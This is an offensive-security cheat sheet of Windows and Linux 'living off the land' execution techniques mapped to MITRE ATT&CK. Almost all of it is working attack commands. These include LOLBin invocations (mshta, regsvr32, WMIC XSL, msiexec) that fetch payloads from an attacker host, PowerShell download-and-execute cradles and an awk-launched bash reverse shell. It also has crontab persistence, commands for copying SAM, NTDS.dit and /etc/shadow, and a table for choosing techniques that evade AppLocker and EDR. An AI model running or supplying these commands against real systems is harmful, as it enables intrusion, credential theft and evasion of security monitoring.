# Indirect Execution Techniques — LOLBins & Proxy Execution Deep Dive

## MITRE ATT&CK Mapping
- **T1202** — Indirect Command Execution
- **T1218** — System Binary Proxy Execution (and sub-techniques)
- **T1220** — XSL Script Processing
- **T1059** — Command and Scripting Interpreter
- **T1105** — Ingress Tool Transfer
- **T1006** — Direct Volume Access

---

## 1. Windows LOLBins — Indirect Execution (T1202)

Execute commands through signed system utilities that bypass command-line monitoring, AppLocker, and WDAC policies.

### Forfiles (T1202)
```cmd
:: Execute arbitrary command by matching a known file
forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd /c C:\temp\payload.exe"
forfiles /p C:\Windows\System32 /m cmd.exe /c "cmd /c powershell -ep bypass -f C:\temp\script.ps1"

:: Execute from Alternate Data Stream
forfiles /p C:\Windows\System32 /m notepad.exe /c "C:\temp\benign.txt:payload.exe"
```

### pcalua.exe — Program Compatibility Assistant (T1202)
```cmd
:: Rarely logged, rarely monitored — flies under most EDR radars
pcalua.exe -a C:\temp\payload.exe
pcalua.exe -a C:\temp\payload.exe -d C:\temp
pcalua.exe -a \\ATTACKER\share\payload.exe          :: UNC path — pull from SMB share
```

### Scriptrunner.exe — App-V Script Runner (T1202)
```cmd
:: Executes batch files/scripts via App-V context
scriptrunner.exe -appvscript C:\temp\payload.cmd
scriptrunner.exe -appvscript \\ATTACKER\share\run.cmd
```

### ssh.exe — ProxyCommand Abuse (T1202)
```cmd
:: ssh.exe ships with Windows 10+ — abuse ProxyCommand for execution
ssh -o ProxyCommand="cmd /c C:\temp\payload.exe" dummy-host
ssh -o ProxyCommand="powershell -ep bypass -c IEX(IWR http://ATTACKER/stager)" x
:: LocalCommand variant (requires PermitLocalCommand yes):
ssh -o LocalCommand="C:\temp\payload.exe" -o PermitLocalCommand=yes dummy@localhost
```

### MSHTA — HTML Application Host (T1218.005)
```cmd
:: Inline JavaScript execution — no file on disk
mshta "javascript:a=new ActiveXObject('WScript.Shell');a.Run('cmd /c whoami > C:\\temp\\out.txt',0);close()"

:: Remote HTA file
mshta http://ATTACKER/payload.hta

:: VBScript variant
mshta "vbscript:Execute(""CreateObject(""""WScript.Shell"""").Run """"calc"""", 0:close"")"
```

### WMIC XSL Loading (T1220)
```cmd
:: Squiblytwo — fetch + execute XSL with embedded JScript
wmic os get /FORMAT:"https://ATTACKER/payload.xsl"
wmic process list /FORMAT:"C:\temp\payload.xsl"

:: Any WMIC alias works with /FORMAT
wmic service list /FORMAT:"https://ATTACKER/evil.xsl"
```

### msxsl.exe — XML Transformation (T1220)
```cmd
:: Microsoft-signed XML transformer — must upload binary first
msxsl.exe data.xml payload.xsl
msxsl.exe payload.xsl payload.xsl        :: Same file can be both args
msxsl.exe report.jpeg report.jpeg         :: Arbitrary extensions accepted
```

### Additional LOLBins for Proxy Execution (T1218)
```cmd
:: Rundll32 — inline JS execution (T1218.011)
rundll32 javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc")

:: Regsvr32 Squiblydoo — fetch SCT, bypasses AppLocker (T1218.010)
regsvr32 /s /n /u /i:http://ATTACKER/payload.sct scrobj.dll

:: CMSTP — INF-based execution, can bypass UAC (T1218.003)
cmstp /ni /s C:\temp\payload.inf

:: MSIExec — remote MSI install (T1218.007)
msiexec /q /i http://ATTACKER/payload.msi

:: Mavinject — DLL injection (T1218.013)
mavinject.exe <PID> /INJECTRUNNING C:\temp\evil.dll
```

---

## 2. Download Chains — Ingress Tool Transfer (T1105)

```cmd
:: Certutil — decode/download (most versatile, often flagged now)
certutil -urlcache -split -f http://ATTACKER/payload.exe C:\temp\payload.exe
certutil -decode encoded.b64 C:\temp\payload.exe

:: BITSAdmin — background download (T1197)
bitsadmin /transfer dlJob /download /priority high http://ATTACKER/p.exe C:\temp\p.exe

:: CertReq — download via certificate request (less known)
certreq -Post -config http://ATTACKER/payload C:\temp\output.exe

:: Expand — extract from CAB over UNC
expand \\ATTACKER\share\payload.cab C:\temp\payload.exe

:: Desktopimgdownldr — via Group Policy Preferences (T1105)
:: Uses BITS under the hood; signed Windows binary
```

### PowerShell Download Cradles (T1059.001 + T1105)
```powershell
# Net.WebClient — classic
(New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1') | IEX

# Invoke-WebRequest
IEX (IWR http://ATTACKER/script.ps1 -UseBasicParsing).Content

# Invoke-RestMethod
IEX (Invoke-RestMethod http://ATTACKER/script.ps1)

# XML channel (stealthy — looks like config fetch)
$x = New-Object Xml.XmlDocument; $x.Load('http://ATTACKER/config.xml'); IEX $x.command.a.'#cdata-section'

# System.Net.Http.HttpClient (.NET 4.5+)
$h = [System.Net.Http.HttpClient]::new(); IEX ($h.GetStringAsync('http://ATTACKER/s.ps1').Result)

# COM object
$c = New-Object -ComObject Msxml2.XMLHTTP; $c.open('GET','http://ATTACKER/s.ps1',$false); $c.send(); IEX $c.responseText
```

---

## 3. Linux Indirect Execution (T1059.004)

Execute commands indirectly through tools not typically monitored by security controls.

```bash
# xargs — pipe commands through xargs
echo "id" | xargs -I{} sh -c '{}'
echo "/tmp/payload" | xargs bash -c

# find -exec — execute via file search
find /tmp -name "payload" -exec {} \;
find / -maxdepth 0 -exec /tmp/payload \;        # Always matches root dir

# awk system() — execute arbitrary commands via awk
awk 'BEGIN{system("/tmp/payload")}'
awk 'BEGIN{system("bash -c \"bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\"")}'

# python3 -c — inline Python execution
python3 -c 'import os; os.system("/tmp/payload")'
python3 -c 'import subprocess; subprocess.call(["/bin/bash","-c","id"])'

# perl -e — inline Perl
perl -e 'system("/tmp/payload")'
perl -e 'exec("/bin/bash","-c","whoami")'

# ruby -e
ruby -e 'exec "/tmp/payload"'

# env — execute via environment utility
env /tmp/payload

# nice / nohup / timeout — wrapper execution
nice /tmp/payload
nohup /tmp/payload &
timeout 60 /tmp/payload

# expect — script interactive commands
expect -c 'spawn /tmp/payload; interact'

# strace as execution wrapper (ironic)
strace -o /dev/null /tmp/payload

# ld.so — direct dynamic linker invocation
/lib64/ld-linux-x86-64.so.2 /tmp/payload

# busybox
busybox ash -c "/tmp/payload"

# script command — starts a new shell, can capture or proxy
script -qc "/tmp/payload" /dev/null

# Crontab one-liner injection
(crontab -l 2>/dev/null; echo "* * * * * /tmp/payload") | crontab -
```

---

## 4. T1006 — Direct Volume Access

Bypass OS file-access controls by reading the raw filesystem directly.

```cmd
:: Windows — raw disk read via CreateFile on \\.\PhysicalDrive0 or volume
:: Requires admin. Used to read locked files (SAM, NTDS.dit) without VSS.
:: Tools: RawCopy, NinjaCopy (PowerShell)

:: NinjaCopy — read locked NTDS.dit or SAM directly from NTFS volume
Invoke-NinjaCopy -Path "C:\Windows\System32\config\SAM" -LocalDestination "C:\temp\SAM"
Invoke-NinjaCopy -Path "C:\Windows\NTDS\ntds.dit" -LocalDestination "C:\temp\ntds.dit"
```

```bash
# Linux — read raw block device (requires root)
# Bypass file permissions by reading the underlying block device
dd if=/dev/sda1 bs=512 skip=<offset> count=<blocks> of=/tmp/extracted
debugfs /dev/sda1 -R "cat /etc/shadow" > /tmp/shadow_copy

# Read deleted files from raw disk
extundelete /dev/sda1 --restore-file /path/to/deleted/file
```

---

## Decision Matrix: When to Use What

| Scenario | Windows Technique | Linux Technique |
|---|---|---|
| AppLocker/WDAC blocking cmd.exe | forfiles, pcalua, scriptrunner | N/A |
| Need to download without PowerShell | certutil, bitsadmin, certreq | curl, wget, python3 |
| EDR monitoring process creation | ssh.exe ProxyCommand, MSHTA inline | awk system(), find -exec |
| No direct shell access | WMIC XSL, regsvr32 SCT | ld.so direct, env wrapper |
| Need fileless execution | PowerShell download cradle + IEX | curl \| bash, python3 -c |
| Bypass file-level AV scanning | msiexec remote, MSHTA remote | memfd_create (see av_edr_bypass.md) |
| Read locked OS files | NinjaCopy (T1006) | dd, debugfs (T1006) |

---

## References
- MITRE T1202: https://attack.mitre.org/techniques/T1202/
- MITRE T1218: https://attack.mitre.org/techniques/T1218/
- MITRE T1220: https://attack.mitre.org/techniques/T1220/
- MITRE T1006: https://attack.mitre.org/techniques/T1006/
- LOLBAS Project: https://lolbas-project.github.io/
- GTFOBins (Linux): https://gtfobins.github.io/
